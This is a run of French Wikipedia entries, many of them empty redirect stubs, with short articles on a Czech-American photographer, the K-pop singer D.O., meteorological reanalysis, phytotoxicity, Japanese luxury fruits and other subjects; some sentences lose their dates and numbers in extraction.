<doc id="9411940" url="https://fr.wikipedia.org/wiki?curid=9411940" title="Partie d'avance">
Partie d'avance



</doc>
<doc id="9411942" url="https://fr.wikipedia.org/wiki?curid=9411942" title="Parties d'avance">
Parties d'avance



</doc>
<doc id="9411944" url="https://fr.wikipedia.org/wiki?curid=9411944" title="Partie de retard">
Partie de retard



</doc>
<doc id="9411945" url="https://fr.wikipedia.org/wiki?curid=9411945" title="Parties de retard">
Parties de retard



</doc>
<doc id="9411955" url="https://fr.wikipedia.org/wiki?curid=9411955" title="Kállay">
Kállay

Kállay peut désigner:

</doc>
<doc id="9411957" url="https://fr.wikipedia.org/wiki?curid=9411957" title="Martin H. M. Schreiber">
Martin H. M. Schreiber

Martin Hugo Maximilian Schreiber, plus connu sous le nom de Martin H. M. Schreiber, est un photographe tchéco-américain né à Prague (Tchécoslovaquie). 
Il est surtout connu pour avoir pris des clichés de Madonna nue en 1979 alors qu'elle était encore anonyme, photos qui furent par la suite publiées dans le magazine "Playboy" en 1985.
Biographie.
Martin Hugo Maximilian Schreiber naît le à Prague (Tchécoslovaquie). Ses parents immigrent aux États-Unis en 1952, et s'installent à New York, où sa mère fait du mannequinat.
Il devient par la suite photographe, et remporte une mention honorable lors d'un concours photo pour le magazine "Life". Il enseigne ensuite pendant plusieurs années dans des écoles d'art de New York, comme la New School Parsons (en 1977) ou la School of Visual Arts. 
En 1979, alors qu'il enseigne la photographie de nu dans un atelier intitulé « "" » à la New School for Social Research de Manhattan, il rencontre la chanteuse Madonna, alors modèle anonyme cherchant à gagner de l'argent pour ses cours de danse. Ils se mettent rapidement en couple, et il la paie pour qu'elle pose nue devant ses étudiants à l'occasion d'une séance de photographie en noir et blanc. Il réutilisera d'ailleurs quelques clichés de cette séance dans son livre "Bodyscapes" (1980). 
En , il aperçoit Madonna, devenue célèbre, sur la couverture du magazine "Time", et décide alors de vendre les clichés au magazine "Playboy", pour plus de . La publication de ces clichés le rend célèbre, et lui permet de vivre de son art.
En 1989, il déménage en France, et s'installe notamment dans la région du Perche à partir de 1993.

</doc>
<doc id="9411964" url="https://fr.wikipedia.org/wiki?curid=9411964" title="André-Auguste Tandon">
André-Auguste Tandon

André-Auguste Tandon est né à Montpellier le et décédé dans la même ville le . Banquier de profession, il était aussi un poète languedocien.
Biographie.
Ses parents étaient Barthélémy Tandon, banquier et Jeanne Maurin.
Appelé , il est le grand-père maternel d'Alfred Moquin-Tandon.
Ses "Fables et Contes en vers patois" publiées la première fois en l'an VIII de la République, puis rééditées en 1813, le font considérer comme un des précurseurs du Félibrige.

</doc>
<doc id="9411972" url="https://fr.wikipedia.org/wiki?curid=9411972" title="D.O.">
D.O.

Do Kyung-soo (), dit D.O. (), est un chanteur et acteur sud-coréen, né le à Goyang (Gyeonggi). Il est membre du boys band sud-coréo-chinois EXO et de son sous-groupe EXO-K. Il en est l'un des chanteurs principaux.
Biographie.
Jeunesse et formation.
Do Kyung-soo nait le à Goyang, dans la province de Gyeonggi. . Il . Il .
À . Au .
En 2010, il . Après avoir gagné une compétition de chant locale, il est approché par des agents de la SM Entertainment et décide de tenter sa chance aux auditions : il . .
Carrière.
2012-2014 : Début en tant que chanteur.
Le , .
En , il . En ".
En 2014, lors de la première tournée d'EXO, il interprète une chanson solo intitulée ", composée et arrangée par Yoo Young-jin. La version complète de la chanson, chantée par ce dernier et D.O., est sortie plus tard en comme deuxième single hebdomadaire du projet SM Station.
2014-2018 : carrière d'acteur.
En , D.O. commence sa carrière d'acteur sous son vrai nom, Do Kyung-soo, dans le film ', où il tient le rôle secondaire, celui de Choi Tae-young, un étudiant et fils d'une commerçante (jouée par l'actrice Yum Jung-ah). Ce . . Plus tard, la même année, il joue le rôle de Han Kang-woo dans la série ' diffusée sur la chaîne SBS, aux côtés des acteurs Gong Hyo-jin et Jo In-sung.
En , il apparaît dans la série "Hello Monster", diffusée sur la chaîne KBS, et y joue le rôle d'un psychopathe. . En août, il est choisi pour le rôle de Doo-young, un athlète national de judo, dans le film "My Annoying Brother" aux côtés de l'acteur Jo Jeong-seok et de l'actrice Park Shin-hye. Lors de sa sortie, ces deux acteurs principaux interprètent le titre principal, intitulé "". En .
En , il prête sa voix au personnage principal dans le film d'animation "Nous, les chiens", qui sortira en 2019. Il joue le rôle principal dans le film romantique ' aux côtés de l'actrice Kim So-hyun. En avril, il intègre le distribution du film ', réalisé par Kim Yong-hwa, une adaptation du webtoon homonyme créée par Joo Ho-min, ainsi que . En octobre, il tient le rôle principal aux côtés de l'actrice Chae Seo-jin dans ", un web-série produit par Samsung.
Le , la confirmé sa participation au film ", réalisé par Kang Hyeong-cheol, dans lequel il incarne Ro Ki-soo, un soldat nord-coréen qui, au milieu du chaos se découvre une passion pour les claquettes dans un camp de concentration basé en Corée du Nord, durant la Guerre de Corée. Il participe également au thriller comique "Room No.7". En décembre, il assiste au festival international du film de Macao aux côtés du réalisateur Choi Dong-hoon, en tant qu'ambassadeur coréen des relations publiques.
Le , la chaîne tvN confirme qu'il fait partie de la série "". La série connaît un succès commercial et devient le cinquième drama coréen le mieux noté de l'histoire de la télévision par câble, et, en 2020, devient la première série CJ ENM à être diffusée sur la chaîne de télévision publique japonaise, NHK General TV.
2019-2021 : enrôlement pour le service militaire.
Le , . Né en 1993, le membre d'EXO a encore du temps avant la date limite de son enrôlement. La raison est qu'à la suite du départ de Xiu-min, il exprime sa volonté d'achever ses fonctions militaires dans les meilleurs délais. Selon la loi en vigueur sur le service militaire, ce dernier pourra reporter son départ cinq fois au total et n'aura plus qu'à s'enrôler d'ici 2021, la véritable année de son départ. Après discussion avec son agence et les membres d'EXO, D.O. partira donc à l'armée et sera le deuxième membre d'EXO à s'enrôler après Xiu-min. Il dévoile un solo en guise de cadeau pour ses fans pour son départ tout comme l'avait fait Xiu-min. Intitulé ('), le titre est sorti dans le cadre du projet SM Station, le . Il a écrit les paroles avec Jo Yoon-Kyung et Hwang Yoo-bin. Doh Kyung-soo interprète Seung-ho, personnage de la comédie musicale militaire ' en juin et .
Après avoir terminé sa formation, il a servi à la Division Capitale en tant que cuisinier.
En 2020, il participe à la campagne Taegeukgi pour commémorer le anniversaire de la guerre de Corée et est choisi pour jouer dans la comédie musicale militaire "", marquant ses débuts sur la scène théâtrale et le retour de ce projet. Une des représentations est diffusée en direct, via Naver TV, le . En raison des protocoles Covid-19, les performances en personne ont été annulées et retransmis en ligne entre le 24 et le .
Au cours de son service, il a également participé à la campagne "" de la et à la campagne de sensibilisation du ministère de la Justice de Corée du Sud contre l'exploitation sexuelle numérique.
En , le réalisateur Kim Yong-hwa confirme l'engagement de Sol Kyung-gu et Do Kyung-soo dans les rôles principaux : l'un tente sauver l'autre seul, coincé, en plein espace à la suite d'un accident.
Depuis 2021 : Retour sur la scène.
Le , après avoir pris ses dernières vacances militaires en sans retourner à sa base conformément aux protocoles de l'armée concernant la pandémie de Covid-19, D.O. revient officiellement de l'armée. En février, il est choisi comme acteur principal dans "Secret", un remake sud-coréen du film taiwanais du même nom.
En , . .
Le , il s'apprête à sortir son premier album solo en fin juillet. L'agence confirme, par la suite, cette information, déclarant : . Cinq jours plus tard, le titre du mini-album est révélé : ', et sort le prochain. Au lendemain de sa sortie, le mini-album se trouvé à la première place du ' de iTunes dans différents depuis sa sortie. L'EP figure également en tête des classements d'albums physique en Chine sur "QQ Music" et "KuGou Music" et "Kuwo Music", tandis qu'en Corée du Sud, il est en tête d"'Hanteo Chart", de "Synnara Record" et "HOTTRACKS". .
En , il fait son retour au petit écran avec la série ", où il joue Jin-jeong, un procureur rebelle se battant pour la justice, pour lequel , et .

</doc>
<doc id="9411974" url="https://fr.wikipedia.org/wiki?curid=9411974" title="Supercoupe d'Europe masculine de handball 2006">
Supercoupe d'Europe masculine de handball 2006

La Supercoupe d'Europe masculine de handball 2006 est la de la compétition qui a eu lieu les 25 et dans la Kölnarena de Cologne en Allemagne.
Elle est remportée par le BM Ciudad Real pour la consécutive.
Équipes engagées et formule.
Les équipes engagées sont :
Le format de la compétition est une phase finale à 4 (demi-finale, finale et match pour la ) avec élimination directe.

</doc>
<doc id="9411975" url="https://fr.wikipedia.org/wiki?curid=9411975" title="Sainte Chapelle (Paris)">
Sainte Chapelle (Paris)



</doc>
<doc id="9411977" url="https://fr.wikipedia.org/wiki?curid=9411977" title="Couronne d'épines du Christ">
Couronne d'épines du Christ



</doc>
<doc id="9411979" url="https://fr.wikipedia.org/wiki?curid=9411979" title="CIE Lab">
CIE Lab



</doc>
<doc id="9411982" url="https://fr.wikipedia.org/wiki?curid=9411982" title="Réanalyse météorologique">
Réanalyse météorologique

La réanalyse météorologique est une méthode météorologique destinée à réanalyser objectivement les données globales de surface et d'altitude prises sur une période s'étendant sur des décennies pour l'assimilation de données dans les modèles de prévision numérique du temps. Plusieurs centres à travers le monde font ce genre de réanalyse qui vise à uniformiser et corriger les données historiques afin de mieux pouvoir faire la prévision météorologique et l'étude de cas passés.
Analyse opérationnelle.
Même un modèle parfait ne pourrait produire une prévision parfaite, car les erreurs dans les conditions initiales (température, humidité, etc.) iront en s'amplifiant lors de la prévision et celle-ci divergera de la réalité. Il est donc nécessaire de connaître avec le plus de précision possible l'état initial de l'atmosphère. Déterminer cet état, appelé "analyse" est en soi un grand défi scientifique qui exige des ressources mathématiques et informatiques comparables à celles dévouées à la prévision elle-même. Les sources de données sont disparates, traditionnellement constituées des observations de surface, s'y ajoutent les données de radiosondage, de profileurs de vents et les mesures effectuées par les avions commerciaux. Actuellement les mesures satellites représentent la source de données la plus importante, et depuis peu, les réflectivités et vitesses radiales radar sont également prises en compte dans certains modèles de méso-échelle.
Cependant l'utilisation des seules données d'observation n'est pas suffisante. D'une part le nombre de variables d'un modèle numérique est supérieur au nombre d'observations, d'autre part une analyse effectuée directement par interpolation des observations aboutirait à un comportement instable du modèle. C'est une des raisons de l'échec des premières tentatives de modélisation du comportement de l'atmosphère par Richardson.
Pour construire l'analyse, on a donc recours à une ébauche, c'est-à-dire la prévision effectuée précédemment, généralement 6 ou 12 heures auparavant. Cette ébauche est alors corrigée pour s'ajuster au plus près des observations, généralement en tenant compte des erreurs d'observation. L'approche la plus communément utilisée actuellement utilise les méthodes du calcul des variations pour déterminer le meilleur compromis entre l'ébauche et les observations, compte tenu de leurs erreurs respectives. Cette approche est désignée par le terme « 3D-Var » lorsqu'elle ne tient compte que de l'état du modèle et des observations valides à l'heure d'analyse, et « 4D-Var » lorsqu'elle tient également compte de l'évolution de ces derniers sur une fenêtre temporelle.
Réanalyse.
Les méthodes décrites précédemment constituent l'assimilation de données, devenu un domaine de recherche à part entière. Les analyses obtenues quotidiennement par les différents centres de prévisions à travers le monde sont conservées et mises en commun pour former une banque de conditions météorologiques historiques. Celle-ci est cependant limitée dans le temps à la période des modèles numérique de prévision du temps. Afin de pouvoir donner des résultats constants lorsque les chercheurs testent une modification aux modèles, il faut qu'ils puissent détenir une banque de données historiques plus longue et surtout qui puisse s'améliorer dans le temps en éliminant les erreurs causées par des manques de données dans certaines zones. 
La "réanalyse météorologique" est ainsi une technique qui vise à constamment mettre à jour les analyses initiales afin de disposer d'une telle banque. Cette tâche en apparence simple est en fait ardue car pour la période couverte par les modèles de prévisions météorologiques, il y a eu des améliorations successives de leur résolution horizontale et verticale, alors que certaines variables ont disparu tandis que de nouvelles ont été introduites. De plus, les instruments de mesure et leurs types ont varié à travers les décennies, avant et après l'ère des modèles. Comme mentionné antérieurement, au début du , seul un nombre limité de données venant de stations météorologique de surface et de bateaux étaient disponibles. Par la suite, les données aérologiques se sont ajoutés à partir des années 1920, les données de satellites à partir des années 1970 et les radars plus récemment. Tout événement météorologique analysé à un moment donné ne dispose donc pas toujours de l'ensemble complet. Ce manque d’homogénéité fait en sorte que les analyses sont des produits difficiles à utiliser, particulièrement pour qui veut analyser le climat sur de longues périodes.
Le CEPMMT/ECMWF en Europe, le NCEP aux États-Unis et plusieurs autres à travers le monde font un tel travail qui permet d'avoir un système cohérent et la correction de plusieurs ajustements manuels dans les zones de données manquantes, où l’estimation de scénarios était habituel. 
Méthode.
Pour produire une réanalyse, ces centres choisissent la version la plus récente de leur modèle de prévision météorologique ainsi que de leur algorithme d'assimilation des données. Ils déterminent ensuite une résolution horizontale et une résolution verticale uniformes qui sera utilisée lors de l'assimilation des données historiques pour toute la période revisitée. De nouvelles sources d’observations qui étaient disponibles mais qui n'étaient pas utilisées au moment de l’analyse antérieure peuvent même être intégrées pour améliorer la représentation du climat. Ce travail est généralement fait pour des périodes où les réseaux d’observations sont variés, denses et fiables sur plusieurs décennies.
Limites.
Bien que la réanalyse est destiné à être le « meilleur » estimé des variables météorologiques, elle doit être utilisée en sachant ses biais et défauts. En effet, les instruments sont régulièrement changés et subissent une détérioration avec l'usage. Ainsi, les capteurs d'un satellite météorologique s'améliorent d'une génération à la suivante mais leurs systèmes se dégradent durant leur durée de vie.
De plus, les diverses réanalyses sont issues de modèles de prévisions différents qui n'utilisent pas les mêmes schémas d’assimilations, n'ont pas la même résolutions et sélections d’observations. Les réanalyses utilisent aussi des variables pour lesquelles il n’existe pas d’observations directes ce qui présente potentiellement les plus grandes disparités car elles sont déterminées uniquement par le modèle de prévision. L'une des contraintes des modèles est également de ne pas conserver l'humidité (précipitations, évapotranspiration, etc.). 
Pour toutes ces raisons, il existe parfois des différences importantes entre les différentes bases de données de réanalyses, surtout dans les régions ou les observations sont rares.

</doc>
<doc id="9411986" url="https://fr.wikipedia.org/wiki?curid=9411986" title="Phytotoxicité">
Phytotoxicité

La phytotoxicité est le caractère toxique d'une substance chimique pour la croissance des plantes.
Cet effet peut être causé par divers composés chimiques naturels ou synthétiques, notamment des traces métalliques, la salinité, des pesticides, des phytotoxines ou des composés allélochimiques.
Substances potentiellement phytotoxiques.
Composés minéraux.
De fortes concentrations de sels minéraux en solution dans le milieu de culture peuvent avoir des effets phytotoxiques.
Les sources de sels minéraux en excès peuvent être l'infiltration d'eau de mer ou l'application en quantité excessive d'engrais minéraux. 
Par exemple, l'urée est utilisée en agriculture comme engrais azoté, mais si on applique une dose excessive, il peut en résulter des effets phytotoxiques, soit à cause de la toxicité de l'urée elle-même, soit à cause de l'ammoniac produit par hydrolyse de l'urée par les uréases du sol. 
Les sols acides peuvent contenir de fortes concentrations d'aluminium (sous forme d'ions Al3+) et de manganèse (sous forme d'ions Mn2+) qui peuvent être phytotoxiques.
Herbicides.
Les herbicides sont des substances conçues pour tuer les plantes, et sont utilisés pour maîtriser les espèces de plantes non désirées comme les mauvaises herbes agricoles. Cependant les herbicides peuvent aussi avoir un effet phytotoxique sur des plantes qui ne sont pas dans la zone ciblée par l'application d'un herbicide, par exemple à la suite d'une dérive de pulvérisation causée par le vent, ou à cause de l'épandage sur le sol de matières contaminées par des herbicides (comme de la paille ou du fumier).
Les effets phytotoxiques des herbicides sont un important sujet d'étude dans le domaine de l'écotoxicologie.

</doc>
<doc id="9411989" url="https://fr.wikipedia.org/wiki?curid=9411989" title="CIE LUV">
CIE LUV



</doc>
<doc id="9411999" url="https://fr.wikipedia.org/wiki?curid=9411999" title="Château de Haute-Sage">
Château de Haute-Sage

Le château de Haute-Sage est un château situé sur la commune de Haux, en Gironde, dans la région naturelle de l'Entre-deux-Mers.
Localisation.
Le château de Haute-Sage est édifié sur une hauteur du coteau dominant la Garonne à environ au sud du bourg. Il est accessible par les routes départementales D10 de Latresne à Saint-Macaire puis D239 à partir de Langoiran et le chemin dit « de Régis ». 
Architecture.
D'aspect évoquant la fin du ou le début du , le château fut peut-être édifié sur une base plus ancienne. 
Le château est composé d'un bâtiment central flanqué de chaque côté d'un pavillon carré. Une dépendance prolonge la façade sud. Sur cette même façade, on trouve une porte encadrée de deux pilastres et surmontée d'une corniche à gouttes. Derrière cette porte, on accède aux étages par un escalier. Celui-ci se prolonge dans une tourelle carrée par un escalier à vis. La présence d'une tourelle contenant un escalier à vis serait un indice attestant une origine du château antérieure au . Une chapelle aurait autrefois existé à l'extrémité sud des dépendances situées à l'est du château.
Protection du patrimoine.
Le château est inscrit au titre des monuments historiques par arrêté du . C'est une propriété privée. La protection concerne les façades, les toitures, les cheminées des deux salons du rez-de-chaussée et de la cuisine .
Château viticole.
Le château de Haute-Sage abrite un domaine viticole du vignoble de l'Entre-deux-Mers producteur des appellations cadillac (AOC) et premières-côtes-de-bordeaux (AOC).

</doc>
<doc id="9412001" url="https://fr.wikipedia.org/wiki?curid=9412001" title="Fermoselle">
Fermoselle

Fermoselle est une municipalité espagnole de la communauté autonome de Castille-et-León et de la province de Zamora. En 2015, elle comptait .

</doc>
<doc id="9412003" url="https://fr.wikipedia.org/wiki?curid=9412003" title="Élections législatives des États-Unis de 2006">
Élections législatives des États-Unis de 2006



</doc>
<doc id="9412005" url="https://fr.wikipedia.org/wiki?curid=9412005" title="Supercoupe d'Europe masculine de handball 2005">
Supercoupe d'Europe masculine de handball 2005

La Supercoupe d'Europe masculine de handball 2005 est la de la compétition qui a eu lieu les 26 et à León en Espagne.
Elle est remportée par le BM Ciudad Real pour la .
Équipes engagées et formule.
Les équipes engagées sont :
Le format de la compétition est une phase finale à 4 (demi-finale, finale et match pour la ) avec élimination directe. 

</doc>
<doc id="9412009" url="https://fr.wikipedia.org/wiki?curid=9412009" title="Tournoi de tennis de Bahia">
Tournoi de tennis de Bahia

Le tournoi de tennis de Bahia (Brésil), est un tournoi de tennis masculin du circuit professionnel ATP organisé en 1983.

</doc>
<doc id="9412011" url="https://fr.wikipedia.org/wiki?curid=9412011" title="L'Art de vivre">
L'Art de vivre

L'art de vivre est la manière de vivre - d'être et de penser - d'une personne ou d'un groupe d'individus. L'expression peut aussi désigner :

</doc>
<doc id="9412013" url="https://fr.wikipedia.org/wiki?curid=9412013" title="Élections législatives américaines de 2014">
Élections législatives américaines de 2014



</doc>
<doc id="9412014" url="https://fr.wikipedia.org/wiki?curid=9412014" title="Élections législatives américaines de 2012">
Élections législatives américaines de 2012



</doc>
<doc id="9412015" url="https://fr.wikipedia.org/wiki?curid=9412015" title="Élections législatives américaines de 2008">
Élections législatives américaines de 2008



</doc>
<doc id="9412017" url="https://fr.wikipedia.org/wiki?curid=9412017" title="Élections législatives américaines de 2004">
Élections législatives américaines de 2004



</doc>
<doc id="9412019" url="https://fr.wikipedia.org/wiki?curid=9412019" title="Élections législatives américaines de 2002">
Élections législatives américaines de 2002



</doc>
<doc id="9412021" url="https://fr.wikipedia.org/wiki?curid=9412021" title="Élections législatives américaines de 2000">
Élections législatives américaines de 2000



</doc>
<doc id="9412022" url="https://fr.wikipedia.org/wiki?curid=9412022" title="Élections législatives américaines de 2006">
Élections législatives américaines de 2006



</doc>
<doc id="9412026" url="https://fr.wikipedia.org/wiki?curid=9412026" title="Commissaire aux droits de l'Homme du Conseil de l'Europe">
Commissaire aux droits de l'Homme du Conseil de l'Europe



</doc>
<doc id="9412028" url="https://fr.wikipedia.org/wiki?curid=9412028" title="Bertrand Thomas Paul Lacombe">
Bertrand Thomas Paul Lacombe



</doc>
<doc id="9412030" url="https://fr.wikipedia.org/wiki?curid=9412030" title="Grande douve du foie">
Grande douve du foie



</doc>
<doc id="9412033" url="https://fr.wikipedia.org/wiki?curid=9412033" title="Institut américain universitaire">
Institut américain universitaire

LInstitut américain universitaire (en anglais ), est une institution américaine d'enseignement supérieur située dans le Sud de la France offrant des opportunités d'études à l'étranger et des programmes d'enseignement dans divers domaines. Son campus principal est situé à Aix-en-Provence, France et propose des programmes satellites en Espagne, au Maroc et au Royaume-Uni.
Histoire.
L'IAU est fondé en 1957 par des universitaires et d'anciens diplomates tels que le Herbert Maza, qui a aussi été son premier président, le Dr Evron Kirkpatrick, l'ambassadrice Jeane Kirkpatrick, et d'autres qui ont voulu créer un lieu pour des Américains intéressés à l'étude des relations diplomatiques en lien avec des intérêts et des carrières dans les affaires étrangères. L'Institut a été fondé sous l'autorité de l'université d'Aix-Marseille et a offert un programme d'échange étudiant avec transfert de crédits à tous ceux qui voulaient vivre et étudier en France pendant une année.
À sa création, l'Institut a été la première institution à offrir des programmes d'études à l'étranger aux étudiants de disciplines autres que l'étude des langues.
En 1966 l'institut avait un effectif d'environ 150 étudiants et en 1976 elle inclut la (fondée par Leo Marchutz) dans le programme. En 2015 l'institut a échangé avec plus de 700 écoles et universités, a vu défiler plus de et a un effectif annuel de 700 étudiants.
L'institut invite en tant que conférenciers des chercheurs, diplomates, journalistes, écrivains, hommes d'affaires venus de divers pays. Il est souvent considéré comme le plus ancien et plus étendu programme d'études à l'étranger en Europe. L'IAU est reconnu par l'université d'état de New York, le rectorat de l'université Aix-Marseille et le ministère français de l'éducation.
Programmes.
Le campus parisien est situé à l'université Paris-Sorbonne et permet l'étude de la langue française. Un programme d'été à Barcelone, en Espagne est destiné aux étudiants intéressés par l'étude de l'espagnol. L'IAU a également un programme à Valence, en Espagne.
L'IAU permet à ses étudiants des études à l'étranger à l'année grâce à plus de 250 universités partenaires à travers les États-Unis, dont certaines institutions notables : Harvard, Cornell, Tufts, Rice, Boston College etc.

</doc>
<doc id="9412036" url="https://fr.wikipedia.org/wiki?curid=9412036" title="Contes de la Montagne sereine">
Contes de la Montagne sereine

Contes de la Montagne sereine ou Qingpingshantang huaben () est une anthologie de contes chinois (ou "huaben"), édité vers 1550 par le lettré bibliophile Hong Pian (), à partir de contes populaires dont il rédigea une version romancée. Il s'agit de la plus ancienne collection connue des contes en langue vulgaire appelés "huaben", qui connurent une vogue sous les Ming.
Le travail original de Hong Pian comprenait une soixantaine de contes, dont une partie est perdue, car il fut oublié durant les siècles suivant. L'anthologie actuelle est en fait issue du travail d'édition de Tan Zhengbi à partir de trouvailles de parties de la compilation originale dans les années 1920 et 1930. C'est ce spécialiste qui donna à l’œuvre son nom actuel.
Les récits compilés dataient pour les plus anciens de l'époque des Song, d'autres de l'époque des Yuan, les plus récents remontant au début du . Ils comprennent tous le répertoire habituel des contes populaires chinois de l'époque : récits fantastiques, histoires d'amour, récits historiques romancés, thématiques religieuses, etc. Ils offrent un aperçu de l'état de cette littérature avant les grandes réalisations romanesques de l'ère Ming, comme "Au bord de l'eau", qui puisèrent allègrement leur inspiration dans cet ensemble de récits en langue vernaculaire.

</doc>
<doc id="9412039" url="https://fr.wikipedia.org/wiki?curid=9412039" title="Un grand sommeil noir (Varèse)">
Un grand sommeil noir (Varèse)

Un grand sommeil noir est une courte pièce pour voix (soprano) et piano d'Edgard Varèse composée en 1906 sur un poème de Paul Verlaine. Il s'agit de la plus ancienne pièce de Varèse dont la partition nous soit parvenue et la seule représentante de sa « première période » (la pièce suivante, "Amériques", date de 1921).
Poème.
Ces trois quatrains sont extraits du recueil "Sagesse" de Verlaine.
&lt;poem&gt;
« Un grand sommeil noir
Tombe sur ma vie :
Dormez, tout espoir,
Dormez, toute envie!
Je ne vois plus rien,
Je perds la mémoire
Du mal et du bien...
O la triste histoire!
Je suis un berceau
Qu'une main balance
Au creux d'un caveau :
Silence, silence! »&lt;/poem&gt;
Nomenclature et structure.
"Un grand sommeil noir" est écrit pour voix de soprano et piano. Il s'agit d'une pièce courte, durant environ trois minutes.
Orchestration.
Une version orchestrale a été réalisée par Antony Beaumont.

</doc>
<doc id="9412041" url="https://fr.wikipedia.org/wiki?curid=9412041" title="Contes de la montagne sereine">
Contes de la montagne sereine



</doc>
<doc id="9412048" url="https://fr.wikipedia.org/wiki?curid=9412048" title="Ruby Roman">
Ruby Roman

Le Ruby Roman est une variété de raisin de table cultivée et vendue uniquement dans la préfecture d'Ishikawa au Japon.
Il est de couleur rouge et ses grains sont de la taille d'une prune. Chaque grappe est soumise à un contrôle qualité drastique et calibrée afin de répondre à un standard rigoureux : ses grains doivent faire plus de chacun et contenir plus de 18 % de sucre.
Il existe également une variété dite "Premium Class" dont les grains doivent peser et les grappes peser au moins . En 2010, seules six grappes ont été certifiées "Premium Class", et en 2011, aucune n'a reçu le label.
Il est réputé être le raisin le plus cher du monde. Lors de sa première vente en 2008, son prix au kilo a atteint . En juillet 2015, une grappe de 26 grains a été adjugée pour un million de yens, soit environ , et en juillet 2016, une grappe de trente grains s’est vendue de yens.

</doc>
<doc id="9412049" url="https://fr.wikipedia.org/wiki?curid=9412049" title="(7212) Artaxerxes">
(7212) Artaxerxes



</doc>
<doc id="9412052" url="https://fr.wikipedia.org/wiki?curid=9412052" title="(7211) Xerxes">
(7211) Xerxes



</doc>
<doc id="9412056" url="https://fr.wikipedia.org/wiki?curid=9412056" title="Lac Henderson">
Lac Henderson

Le lac Henderson est un lac dans les monts Adirondacks dans la ville de Newcomb du comté d'Essex dans l'État de New York aux États-Unis. Le lac occupe une ancienne vallée glaciaire de trois kilomètres de long. Il a été nommé en 1826 d'après David Henderson, un des fondateurs de Elba Iron Works près du Lake Placid et de Upper Works à Tahawus.
Les cartographes citent principalement le lac comme étant le point de départ officiel du fleuve Hudson, situé à l'extrémité est et à la sortie du lac, bien que la source de la rivière soit généralement localisée dans le ruisseau Indian Pass ou d'autres cours d'eau jusqu'au lac Tear of the Clouds.

</doc>
<doc id="9412057" url="https://fr.wikipedia.org/wiki?curid=9412057" title="Eugène Félix Anglès">
Eugène Félix Anglès



</doc>
<doc id="9412062" url="https://fr.wikipedia.org/wiki?curid=9412062" title="(1068) Nofretete">
(1068) Nofretete



</doc>
<doc id="9412064" url="https://fr.wikipedia.org/wiki?curid=9412064" title="Viaduc des Clairets">
Viaduc des Clairets



</doc>
<doc id="9412067" url="https://fr.wikipedia.org/wiki?curid=9412067" title="Un jeune poète">
Un jeune poète

Un jeune poète est un film français réalisé par Damien Manivel, sorti en 2015.
Synopsis.
À peine sorti de l'adolescence, Rémi rêve de devenir poète et d'enchanter le monde avec des vers bouleversants et inoubliables. À la recherche de l'inspiration dans la ville de Sète, sous un soleil accablant et avec pour seules armes un Bic et un carnet, Rémi est bien décidé à écrire son poème ... mais par où commencer ? Contempler longuement la mer ? Grimper au sommet d'une montagne ? Ecouter le chant des oiseaux ? Aller à la bibliothèque ? Trouver sa Muse ? Dans les bars ? Au cimetière ? Sous l'eau ? Et si tout ça ne fonctionne vraiment pas, alors boire, boire, boire encore jusqu'à ce que jaillisse l'étincelle.

</doc>
<doc id="9412071" url="https://fr.wikipedia.org/wiki?curid=9412071" title="Coreius">
Coreius

Coreius est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes. "Coreius" est également connus comme « goujons ». Ce genre est endémique des habitats d'eau douce en Chine.
Liste des espèces.
Selon :

</doc>
<doc id="9412076" url="https://fr.wikipedia.org/wiki?curid=9412076" title="Abell 3266">
Abell 3266

Abell 3266 est un amas de galaxies dans le ciel austral. Il fait partie du superamas de l'Horologe-Réticule.
Le département de physique de l'université du Maryland, Baltimore County, a découvert qu'une grande masse de gaz traverse l'amas à une vitesse de 750 km/s (466 miles/seconde). La masse représente des milliards de masses solaires, a un diamètre d'environ 3 millions d'années-lumière et est la plus grande de ce type découverte en juin 2006.

</doc>
<doc id="9412077" url="https://fr.wikipedia.org/wiki?curid=9412077" title="Yubari King">
Yubari King

Le est une variété de melon cantaloup cultivée sous serre à Yūbari, une petite ville près de Sapporo, sur l'île de Hokkaido, au Japon.
Le melon est devenu le produit local phare de la ville à la suite de la campagne de promotion « Un village un produit » initiée en 1980 et sa culture a permis d'y maintenir une activité économique alors que la région avait été durement touchée par la crise du charbon de la décennie précédente.
Le Yubari King est un croisement de deux variétés de melon : le Earl's Favourite et le Burpee's Spicy Cantaloupe. Un Yubari King de qualité supérieure doit être parfaitement sphérique et avoir la peau bien lisse. Une partie de la tige est systématiquement conservée lors de la récolte à des fins esthétiques.
Lors de la première enchère de la saison, une vente record a généralement lieu. En 2008, deux melons Yubari ont été adjugés pour de yens, soit plus de , en 2018, de yens (), en 2019, de yens () et en 2021 de yens ().
Il n'est pas rare que ce fruit soit offert en cadeau à un supérieur hiérarchique durant le Chūgen.
En , le gouvernement japonais annonce que le melon de Yūbari comme le bœuf de Kobe serait désormais protégé par un label, équivalent de l'Indication géographique protégée (IGP) utilisée en Europe.

</doc>
<doc id="9412078" url="https://fr.wikipedia.org/wiki?curid=9412078" title="Bang Min-ah">
Bang Min-ah

Bang Minah (coréen: 방민아; née le ) mieux connue sous le nom de Minah (coréen: 민아), est une chanteuse et actrice sud-coréenne. Elle est membre du girl group Girl's Day depuis 2010 et débute en tant qu'artiste solo en 2015 avec son premier mini-album, "I Am A Woman Too". Elle a joué dans différents films et séries télévisées, comme "Vampire Idol" (2011) et "Holly" (2013).
Biographie.
Bang Minah est née le à Incheon en Corée du Sud. Elle a été à la haute école de Jinsun réservée aux filles et est actuellement spécialisée en radiodiffusion de l'université des femmes de Dongduk réservé aux femmes.
Girl's Day.
Le , Minah fait ses débuts en tant que membre du girl group Girl's Day au "Music Bank" avec leur premier single "Tilt My Head" (coréen: 갸우뚱; RR: Gyauttung).
Carrière solo.
Le , DreamT annonce que Minah fera ses débuts solo à la mi-mars. Le , il est annoncé que Minah fera ses débuts solos le . Le , Minah fait ses débuts solo avec le mini-album "I Am a Woman too". Pour cette occasion le MV du titre-phare du même nom est mis en ligne.
Vie privée.
Minah serait en couple avec le footballeur Son Heung-min, qui a été dénié par son agence, DreamT Entertainment le , cependant, il est plus tard confirmé. Le , il est révélé qu'ils se sont séparés dû aux difficultés de leur relation à distance et leur horaire chargé.
Filmographie.
2016 : Beautilful Gong Shim (Gong Shim)
2019 : My Absolute Boyfriend (Um Da-da)
2020 : Snowball
2021 : Check Out The Event ( Song Yi)
2023 : Delivery Man ( Kang Ji Hyun)
2023 : Hwasahan geunyeo (Joo-Yeong)

</doc>
<doc id="9412080" url="https://fr.wikipedia.org/wiki?curid=9412080" title="Yang Shen">
Yang Shen

